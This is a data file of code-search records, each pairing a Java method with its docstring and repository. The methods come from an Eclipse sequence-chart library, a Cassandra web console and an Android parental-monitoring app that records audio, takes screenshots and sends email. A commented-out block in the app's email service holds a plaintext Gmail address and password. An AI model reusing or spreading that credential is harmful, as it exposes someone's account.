"size": 342429}
{"docstring": "/**\n * Convenience method for disposing all of the items on this chart and refreshing.\n * \n *\n */\n", "func_signal": "public void clearChart()", "code": "{\n\tfor (UMLItem item : getItems()) {\n\t\titem.dispose();\n\t}\n\tdirty = true;\n\tlayout();\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\UMLChart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * @param parent\n * @param style\n */\n", "func_signal": "public UMLChart(Composite parent, int style)", "code": "{\n\tsuper(parent, style);\n\tthis.selectedItems = new UMLItem[0];\n\tfontRegistry = new TreeMap<Integer, Font>();\n\tdeadFonts = new LinkedList<Font>();\n\tnextId = 0;\n\tthis.items = new TreeSet<UMLItem>(new Comparator<UMLItem>(){\n\t\tpublic int compare(UMLItem o1, UMLItem o2) {\n\t\t\treturn o1.getid() - o2.getid();\n\t\t}\n\t});\n\tlisteners = new ListenerList();\n\tdirty = false;\n\tthis.contents = createContents(this, style);\n\tsetLayout(new FillLayout());\n\taddDisposeListener(new DisposeListener(){\n\t\tpublic void widgetDisposed(DisposeEvent e) {\n\t\t\tUMLChart.this.widgetDisposed(e);\n\t\t}\n\t});\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\UMLChart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.zest.custom.sequence.visuals.WidgetVisualPart#installFigures()\n */\n", "func_signal": "@Override\nprotected void installFigures()", "code": "{\n\tIFigure layer = getLayer(LayerConstants.CONNECTION_LAYER);\n\tif (layer != null) {\n\t\tlayer.add(getFigure());\n\t}\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\visuals\\ConnectionVisualPart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.zest.custom.sequence.widgets.PropertyChangeListener#propertyChanged(java.lang.Object, java.lang.String, java.lang.Object, java.lang.Object)\n */\n", "func_signal": "public void propertyChanged(Object sourceObject, String property,\n\t\tObject oldValue, Object newValue)", "code": "{\n\tboolean sourceNode = (source != null && sourceObject.equals(source.getWidget()));\n\tnodePropertyChanged((sourceNode) ? source : target, property, oldValue, newValue);\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\visuals\\ConnectionVisualPart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * @param e\n */\n", "func_signal": "protected void widgetDisposed(DisposeEvent e)", "code": "{\n\tUMLItem[] items = getItems();\n\t//clear the items from the list so that we don't waste time deleting them\n\t//on the dispose.\n\tthis.items.clear();\n\tfor (UMLItem item : items) {\n\t\titem.dispose();\n\t}\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\UMLChart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.swt.widgets.Canvas#setFont(org.eclipse.swt.graphics.Font)\n */\n", "func_signal": "@Override\npublic void setFont(Font font)", "code": "{\n\tfor (Font f : fontRegistry.values()) {\n\t\t//store the fonts until disposal just in case a child is still referencing that font.\n\t\tdeadFonts.add(f);\n\t\tfontRegistry.clear();\n\t}\n\tFont old = getFont();\n\tsuper.setFont(font);\n\tfirePropertyChange(\"fnt\", old, font);\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\UMLChart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * @param thread\n * @param results\n * @throws SQLException\n */\n", "func_signal": "public CallImpl(ThreadImpl thread, ResultSet results) throws SQLException", "code": "{\n\tsuper(thread, results);\n\tsequence = null;\n}", "path": "ca.uvic.chisel.javasketch.data\\src\\ca\\uvic\\chisel\\javasketch\\data\\model\\imple\\internal\\CallImpl.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * Sets the selection and fires an event.\n * @param items\n */\n", "func_signal": "protected void internalSetSelection(UMLItem[] items)", "code": "{\n\tHashSet<UMLItem> oldSelection = new HashSet<UMLItem>(Arrays.asList(this.selectedItems));\n\tsetSelection(items);\n//\t\tsend an event for each new selection\n\tif (oldSelection.size() != 0 && items.length == 0) {\n\t\t//clear the selection\n\t\tEvent event = new Event();\n\t\tevent.widget = this;\n\t\tevent.item = null;\n\t\tint type = SWT.Selection;\n\t\tevent.type = type;\n\t\tnotifyListeners(type, event);\n\t} else {\n\t\tfor (UMLItem item : items) {\n\t\t\tEvent event = new Event();\n\t\t\tevent.widget = this;\n\t\t\tevent.item = item;\n\t\t\tint type = SWT.Selection;\n\t\t\tif (oldSelection.contains(item)) {\n\t\t\t\ttype = SWT.DefaultSelection;\n\t\t\t}\n\t\t\tevent.type = type;\n\t\t\tnotifyListeners(type, event);\n\t\t}\n\t}\n\t\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\UMLChart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see ca.uvic.chisel.javasketch.data.model.ICall#getOrderedSequence()\n */\n", "func_signal": "public List<Long> getOrderedSequence()", "code": "{\n\tif (sequence == null) {\n\t\tsequence = WriteDataUtils.fromStoredSequence(getSequence());\n\t}\n\treturn sequence;\n}", "path": "ca.uvic.chisel.javasketch.data\\src\\ca\\uvic\\chisel\\javasketch\\data\\model\\imple\\internal\\CallImpl.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.mylar.zest.custom.sequence.visuals.WidgetVisualPart#activate()\n */\n", "func_signal": "@Override\npublic void activate()", "code": "{\n\tsuper.activate();\n\tsetVisibility(true);\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\visuals\\ConnectionVisualPart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.mylar.zest.custom.sequence.visuals.WidgetVisualPart#deactivate()\n */\n", "func_signal": "@Override\npublic void deactivate()", "code": "{\n\tsuper.deactivate();\n\tsetSource(null);\n\tsetTarget(null);\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\visuals\\ConnectionVisualPart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * Get the next binary\n * \n * @param bytes\n * @return\n */\n", "func_signal": "public static byte[] next(byte[] bytes)", "code": "{\n\tbyte[] next = new byte[bytes.length];\n\tSystem.arraycopy(bytes, 0, next, 0, next.length);\n\tfor (int i = next.length-1; i >= 0; i--) {\n\t\tint b = (next[i] & 0xff);\n\t\tif (b == 0xff) {\n\t\t\tnext[i] = 0;\n\t\t} else {\n\t\t\tnext[i] = (byte)((b+1) & 0xff);\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn next;\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Convert long to byte array.\n * \n * @param l\n * @return\n */\n", "func_signal": "public static byte[] toBytes(long l)", "code": "{\n\treturn new byte[] {\n\t\t\t(byte)(l >> 56),\n\t\t\t(byte)(l >> 48),\n\t\t\t(byte)(l >> 40),\n\t\t\t(byte)(l >> 32),\n\t\t\t(byte)(l >> 24),\n\t\t\t(byte)(l >> 16),\n\t\t\t(byte)(l >>  8),\n\t\t\t(byte)(l >> 0)\n\t};\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get binary as Inet adress.\n * @param bytes\n * @return\n */\n", "func_signal": "public static InetAddress toAddress(byte[] bytes)", "code": "{\n\ttry {\n\t\treturn InetAddress.getByAddress(bytes);\n\t} catch (UnknownHostException ex) {\n\t\treturn null;\n\t}\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Convert short to byte array.\n * \n * @param s\n * @return\n */\n", "func_signal": "public static byte[] toBytes(short s)", "code": "{\n\treturn new byte[] {\n\t\t\t(byte)(s >> 8),\n\t\t\t(byte)(s >> 0)\n\t};\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Load properties from the file.\n * \n * @throws IOException\n */\n", "func_signal": "public void loadProperties() throws IOException", "code": "{\n\t\n\tFile userPropertyFile = getPropertiesFile();\n\t\n\tif (userPropertyFile.exists()) {\n\t\tproperties = new Properties();\n\t\tFileInputStream fis = new FileInputStream(userPropertyFile);\n\t\ttry {\n\t\t\tproperties.load(fis);\n\t\t} finally {\n\t\t\tfis.close();\n\t\t}\n\t}\n\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\service\\CassandraProperties.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get NodeProbe connected to default host and port.\n * @return\n */\n", "func_signal": "public NodeProbe getProbe()", "code": "{\n\tString host = properties.getProperty(\"cassandra.host\");\n\treturn getProbe(host);\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\service\\CassandraClientProvider.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get the property file related to current user.\n * @return\n */\n", "func_signal": "private File getPropertiesFile()", "code": "{\n\treturn new File(\n\t\t\tSystem.getProperty(\"user.home\"),\n\t\t\tfileName\n\t);\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\service\\CassandraProperties.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get binary as short value.\n * \n * @param bytes\n * @return\n */\n", "func_signal": "public static short toShort(byte[] bytes)", "code": "{\n\treturn (short)(\n\t\t((bytes[0] & 0xff) << 8) | \n\t\t((bytes[1] & 0xff) << 0)\n\t);\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Save properties to the file.\n * @throws IOException\n */\n", "func_signal": "public void saveProperties() throws IOException", "code": "{\n\tFile userPropertyFile = getPropertiesFile();\n\tFileOutputStream fos = new FileOutputStream(userPropertyFile);\n\ttry {\n\t\tproperties.store(fos, \"Cassandra WebConsole User Properties\");\n\t} finally {\n\t\tfos.close();\n\t}\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\service\\CassandraProperties.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Convert integer to byte array.\n * \n * @param i\n * @return\n */\n", "func_signal": "public static byte[] toBytes(int i)", "code": "{\n\treturn new byte[] {\n\t\t\t(byte)(i >> 24),\n\t\t\t(byte)(i >> 16),\n\t\t\t(byte)(i >>  8),\n\t\t\t(byte)(i >> 0)\n\t};\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/*\n * (non-Javadoc)\n * @see freemarker.template.TemplateExceptionHandler#handleTemplateException(freemarker.template.TemplateException, freemarker.core.Environment, java.io.Writer)\n */\n", "func_signal": "public void handleTemplateException(\n\t\tTemplateException exception,\n\t\tEnvironment environment,\n\t\tWriter writer)\n\t\t\tthrows TemplateException", "code": "{\n\ttry {\n\t\tif (exception.getCause().getClass() == NoSuchMessageException.class) {\n\t\t\tNoSuchMessageException ex = (NoSuchMessageException) exception.getCause();\n\t\t\twriter.write(ex.getMessage());\n\t\t} else {\n\t\t\twriter.write(\"Error: \");\n\t\t\twriter.write(exception.getMessage());\n\t\t}\n\t} catch (IOException ex) {\n\t\tlog.warn(ex.getMessage(), ex);\n\t}\n\t\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\FreemarkerExceptionHandler.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Convert long to uptime string\n * \n * @param uptime\n * @return\n */\n", "func_signal": "private String getUptimeString(long uptime)", "code": "{\n\tuptime = uptime / 1000L;\n\tlong uptimeSec = uptime % 60L;\n\tuptime = uptime / 60L;\n\tlong uptimeMin = uptime % 60L;\n\tuptime = uptime / 60L;\n\tlong uptimeHour = uptime % 24L;\n\tuptime = uptime / 24L;\n\treturn String.format(\n\t\t\t\"%dd %02dh %02dm %02ds\", uptime, uptimeHour, uptimeMin, uptimeSec\n\t);\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\controller\\SystemController.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get Thrift Client\n * @return\n * @throws TTransportException\n * @throws ConnectException\n */\n", "func_signal": "public Client getThriftClient() throws TTransportException, ConnectException", "code": "{\n\t\n\tif (!properties.hasProperties()) {\n\t\treturn null;\n\t}\n\t\n\tString host = properties.getProperty(CassandraProperties.HOST);\n\tint port = Integer.parseInt(properties.getProperty(CassandraProperties.THRIFT_PORT));\n\t\n\t// Check usage of framed transport\n\tString framed = properties.getProperty(CassandraProperties.FRAMED_TRANSPORT);\n\tboolean isFramed = (framed != null && Boolean.valueOf(framed));\n\t\n\tClient client = th.get();\n\tif (client == null) {\n\t\tTTransport transport = new TSocket(host, port);\n\t\t((TSocket) transport).setTimeout(10000);\n\t\t// wrap transport if framed transport is enabled\n\t\tif (isFramed) {\n\t\t\ttransport = new TFramedTransport(transport);\n\t\t}\n\t\tTProtocol protocol = new TBinaryProtocol(transport);\n\t\ttransport.open();\n\t\tclient = new Client(protocol);\n\t\tth.set(client);\n\t}\n\treturn client;\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\service\\CassandraClientProvider.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get NodeProbed connected to specified host.\n * \n * @param host\n * @return\n */\n", "func_signal": "public synchronized NodeProbe getProbe(String host)", "code": "{\n\t\n\tint port = Integer.parseInt(properties.getProperty(\"cassandra.jmx.port\"));\n\t\n\tNodeProbe probe = probeMap.get(host + \":\" + port);\n\tif (probe == null) {\n\t\ttry {\n\t\t\tprobe = new NodeProbe(host, port);\n\t\t\tprobeMap.put(host + \":\" + port, probe);\n\t\t} catch (IOException e) {\n\t\t\treturn null;\n\t\t} catch (Exception e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\t} else {\n\t\ttry {\n\t\t\t// check the connectivity\n\t\t\tprobe.getToken();\n\t\t} catch (RuntimeException e) { \n\t\t\t// clean jmx if failed to get token\n\t\t\tprobeMap.remove(host + \":\" + port);\n\t\t\t// retry\n\t\t\ttry {\n\t\t\t\tprobe = new NodeProbe(host, port);\n\t\t\t\tprobeMap.put(host + \":\" + port, probe);\n\t\t\t} catch (Exception ee) {\n\t\t\t\treturn null;\n\t\t\t}\n\t\t}\n\t}\n\treturn probe;\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\service\\CassandraClientProvider.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get binary as long value.\n * @param bytes\n * @return\n */\n", "func_signal": "public static long toLong(byte[] bytes)", "code": "{\n\treturn (long)(\n\t\t((long)(bytes[0] & 0xff) << 56) |\n\t\t((long)(bytes[1] & 0xff) << 48) |\n\t\t((long)(bytes[2] & 0xff) << 40) |\n\t\t((long)(bytes[3] & 0xff) << 32) |\n\t\t((long)(bytes[4] & 0xff) << 24) |\n\t\t((long)(bytes[5] & 0xff) << 16) |\n\t\t((long)(bytes[6] & 0xff) << 8) |\n\t\t((long)(bytes[7] & 0xff) << 0)\n\t);\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get binary as int value.\n * \n * @param bytes\n * @return\n */\n", "func_signal": "public static int toInt(byte[] bytes)", "code": "{\n\treturn \n\t\t((bytes[0] & 0xff) << 24) |\n\t\t((bytes[1] & 0xff) << 16) |\n\t\t((bytes[2] & 0xff) << 8) |\n\t\t(bytes[3] & 0xff);\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Convert char to byte array.\n * @param c\n * @return\n */\n", "func_signal": "public static byte[] toBytes(char c)", "code": "{\n\treturn new byte[] {\n\t\t\t(byte)(c >> 8),\n\t\t\t(byte)(c >> 0)\n\t};\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Set property key and value.\n * @param key\n * @param value\n */\n", "func_signal": "public synchronized void setProperty(String key, String value)", "code": "{\n\tif (properties == null) {\n\t\tproperties = new Properties();\n\t}\n\tproperties.setProperty(key, value);\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\service\\CassandraProperties.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Get the previous binary\n * \n * @param bytes\n * @return\n */\n", "func_signal": "public static byte[] previous(byte[] bytes)", "code": "{\n\tbyte[] prev = new byte[bytes.length];\n\tSystem.arraycopy(bytes, 0, prev, 0, prev.length);\n\tfor (int i = prev.length-1; i >= 0; i--) {\n\t\tint b = (prev[i] & 0xff);\n\t\tif (b == 0) {\n\t\t\tprev[i] = (byte)(255 & 0xff);\n\t\t} else {\n\t\t\tprev[i] = (byte)((b-1) & 0xff);\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn prev;\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\util\\ByteArray.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "/**\n * Start the server.\n * \n * @throws Exception\n */\n", "func_signal": "public void start() throws Exception", "code": "{\n\t\n\tserver = new Server(port);\n\t\n\tWebAppContext context = new WebAppContext();\n\tcontext.setContextPath(\"/\");\n\t\n\tFile file = new File(basePath, \"webapp\");\n\tURI uri = file.toURI();\n\t\n\tcontext.setWar(uri.toString());\n\t\n\tHandlerList list = new HandlerList();\n\tlist.addHandler(context);\n\tlist.addHandler(new DefaultHandler());\n\t\n\tserver.setHandler(list);\n\t\n\tserver.start();\n\t\n}", "path": "src\\main\\java\\net\\ameba\\cassandra\\web\\standalone\\StandaloneServer.java", "repo_name": "suguru/cassandra-webconsole", "stars": 103, "license": "apache-2.0", "language": "java", "size": 8525}
{"docstring": "// Create a screen snapshot and returns path to file where it is written.\n", "func_signal": "@Override public java.lang.String takeScreenshot() throws android.os.RemoteException", "code": "{\nandroid.os.Parcel _data = android.os.Parcel.obtain();\nandroid.os.Parcel _reply = android.os.Parcel.obtain();\njava.lang.String _result;\ntry {\n_data.writeInterfaceToken(DESCRIPTOR);\nmRemote.transact(Stub.TRANSACTION_takeScreenshot, _data, _reply, 0);\n_reply.readException();\n_result = _reply.readString();\n}\nfinally {\n_reply.recycle();\n_data.recycle();\n}\nreturn _result;\n}", "path": "childroid\\gen\\parentalcontroller\\child\\Logic\\IScreenshotProvider.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/**\n * Starts a new recording.\n */\n", "func_signal": "public void start() throws IOException", "code": "{\n\tString state = android.os.Environment.getExternalStorageState();\n\tif (!state.equals(android.os.Environment.MEDIA_MOUNTED)) {\n\t\tthrow new IOException(\"SD Card is not mounted.  It is \" + state\n\t\t\t\t+ \".\");\n\t}\n\n\t// make sure the directory we plan to store the recording in exists\n\tFile directory = new File(path).getParentFile();\n\tif (!directory.exists() && !directory.mkdirs()) {\n\t\tthrow new IOException(\"Path to file could not be created.\");\n\t}\n\n\trecorder.setAudioSource(MediaRecorder.AudioSource.MIC);\n\trecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);\n\trecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);\n\trecorder.setOutputFile(path);\n\trecorder.prepare();\n\trecorder.start();\n}", "path": "childroid\\src\\parentalcontroller\\child\\com\\File\\AudioRecordService.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/*get content type\n */\n", "func_signal": "public String getContentType()", "code": "{   \n    if (type == null)   \n        return \"application/octet-stream\";   \n    else  \n        return type;   \n}", "path": "childroid\\src\\parentalcontroller\\child\\com\\Internet\\GMailSender.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/** Called when the activity is first created. */\n", "func_signal": "@Override\npublic void onCreate(Bundle savedInstanceState)", "code": "{\n\tsuper.onCreate(savedInstanceState);\n\tsetContentView(R.layout.mapviewlayout);\n\n\tthis.mapView = (MapView) findViewById(R.id.mapView);\n\tthis.mapView.setBuiltInZoomControls(true);\n\n\tmapView.setSatellite(true);\n\t// mapView.setStreetView(true);\n\t// mapView.setTraffic(true);\n\n\tmc = mapView.getController();\n\tString coordinates[] = { \"1.352566007\", \"103.78921587\" };\n\tdouble lat = Double.parseDouble(coordinates[0]);\n\tdouble lng = Double.parseDouble(coordinates[1]);\n\tp = new GeoPoint((int) (lat * 1E6), (int) (lng * 1E6));\n\tmc.animateTo(p);\n\tmc.setZoom(13);\n\n\t// ---Add a location marker---\n\tMapOverlay mapOverlay = new MapOverlay();\n\tList<Overlay> listOfOverlays = mapView.getOverlays();\n\tlistOfOverlays.clear();\n\tlistOfOverlays.add(mapOverlay);\n\n\tmapView.invalidate();\n\n}", "path": "childroid\\src\\parentalcontroller\\child\\GUI\\MapViewActivity.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "// this piece of code work with phones\n/*\n * @Override public void onCreate(Bundle savedInstanceState) {\n * super.onCreate(savedInstanceState);\n * \n * \n * setContentView(R.layout.email);\n * \n * send = (Button) findViewById(R.id.emailsendbutton);\n * \n * address = (EditText) findViewById(R.id.emailaddresstv);\n * \n * subject = (EditText) findViewById(R.id.emailsubjecttv);\n * \n * emailtext = (EditText) findViewById(R.id.emailtext);\n * \n * send.setOnClickListener(new OnClickListener() {\n * \n * @Override\n * \n * public void onClick(View v) { // TODO Auto-generated method stub try {\n * GMailSender sender = new GMailSender(\"childroid403@gmail.com\",\n * \"childroid403\"); sender.sendMail(\"This is Subject\",\n * \"This is Body\",\"childroid403@gmail.com\",\"ak47gc@gmail.com\"); } catch\n * (Exception e) { Log.e(\"SendMail\", e.getMessage(), e); }\n * \n * // TODO Auto-generated method stub\n * \n * final Intent emailIntent = new Intent(\n * \n * android.content.Intent.ACTION_SEND);\n * \n * emailIntent.setType(\"image/png\");\n * \n * emailIntent.putExtra(android.content.Intent.EXTRA_EMAIL,\n * \n * new String[] { address.getText().toString() });\n * \n * emailIntent.putExtra(android.content.Intent.EXTRA_SUBJECT,\n * \n * subject.getText());\n * \n * emailIntent.putExtra(android.content.Intent.EXTRA_TEXT,\n * \n * emailtext.getText());\n * \n * emailIntent.putExtra(Intent.EXTRA_STREAM, Uri\n * \n * .parse(\"android.resource://\"\n * \n * + getPackageName() + \"/\" + R.drawable.icon));\n * \n * startActivity(Intent.createChooser(emailIntent,\"Send mail...\")); } });\n * \n * }\n */\n// -----------------------------------------------\n/*\n * String aEmailList[] String aEmailCCList[] String aEmailBCCList[] String\n * aEmailSubject String aEmailTEXT\n */\n/*\n * String aEmailList[] = { \"ak47gc@gmail.com\", \"jayani2010@gmail.com\" };\n * String aEmailCCList[] = { \"ak47gc@gmail.com\", \"jayani2010@gmail.com\" };\n * String aEmailBCCList[] = { \"ak47gc@gmail.com\", \"jayani2010@gmail.com\" };\n */\n", "func_signal": "private void sendEmail(Bundle bundle)", "code": "{\n\t/*\n\t * send email to the parentdroid\n\t */\n\n\tIntent emailIntent = new Intent(android.content.Intent.ACTION_SEND);\n\n\tString aEmailList[] = bundle\n\t\t\t.getStringArray(android.content.Intent.EXTRA_EMAIL);\n\tString aEmailCCList[] = bundle\n\t\t\t.getStringArray(android.content.Intent.EXTRA_CC);\n\tString aEmailBCCList[] = bundle\n\t\t\t.getStringArray(android.content.Intent.EXTRA_BCC);\n\tString aEmailSubject = bundle\n\t\t\t.getString(android.content.Intent.EXTRA_SUBJECT);\n\tString aEmailTEXT = bundle.getString(android.content.Intent.EXTRA_TEXT);\n\n\temailIntent.putExtra(android.content.Intent.EXTRA_EMAIL, aEmailList);\n\temailIntent.putExtra(android.content.Intent.EXTRA_CC, aEmailCCList);\n\temailIntent.putExtra(android.content.Intent.EXTRA_BCC, aEmailBCCList);\n\n\temailIntent.putExtra(android.content.Intent.EXTRA_SUBJECT,\n\t\t\taEmailSubject);\n\n\temailIntent.setType(\"plain/text\");\n\temailIntent.putExtra(android.content.Intent.EXTRA_TEXT, aEmailTEXT);\n\n\tstartActivity(emailIntent);\n\n\t/*\n\t * final Intent emailIntent = new\n\t * Intent(android.content.Intent.ACTION_SEND);\n\t * \n\t * emailIntent.setType(\"plain/text\");\n\t * \n\t * emailIntent.putExtra(android.content.Intent.EXTRA_EMAIL, new\n\t * String[]{ \"ak47gc@gmail.com\",\"jayani2010@gmail.com\"});\n\t * \n\t * emailIntent.putExtra(android.content.Intent.EXTRA_SUBJECT,\n\t * \"Test msg\");\n\t * \n\t * emailIntent.putExtra(android.content.Intent.EXTRA_TEXT,\n\t * \"Hurray, its working....\");\n\t * \n\t * startActivity(Intent.createChooser(emailIntent, \"Send mail...\"));\n\t */\n\n}", "path": "childroid\\src\\parentalcontroller\\child\\Logic\\EMailSendService.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/*\n * add a attachment to the mail\n */\n", "func_signal": "public void addAttachment(String filename,String subject) throws Exception", "code": "{ \n    BodyPart messageBodyPart = new MimeBodyPart(); \n    DataSource source = new FileDataSource(filename); \n    messageBodyPart.setDataHandler(new DataHandler(source)); \n    messageBodyPart.setFileName(filename); \n    multipart.addBodyPart(messageBodyPart);\n\n    BodyPart messageBodyPart2 = new MimeBodyPart(); \n    messageBodyPart2.setText(subject); \n\n    multipart.addBodyPart(messageBodyPart2); \n}", "path": "childroid\\src\\parentalcontroller\\child\\com\\Internet\\GMailSender.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "// Checks whether the native background application is running\n// (and thus whether the screenshots are available)\n", "func_signal": "@Override public boolean isAvailable() throws android.os.RemoteException", "code": "{\nandroid.os.Parcel _data = android.os.Parcel.obtain();\nandroid.os.Parcel _reply = android.os.Parcel.obtain();\nboolean _result;\ntry {\n_data.writeInterfaceToken(DESCRIPTOR);\nmRemote.transact(Stub.TRANSACTION_isAvailable, _data, _reply, 0);\n_reply.readException();\n_result = (0!=_reply.readInt());\n}\nfinally {\n_reply.recycle();\n_data.recycle();\n}\nreturn _result;\n}", "path": "childroid\\gen\\parentalcontroller\\child\\Logic\\IScreenshotProvider.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
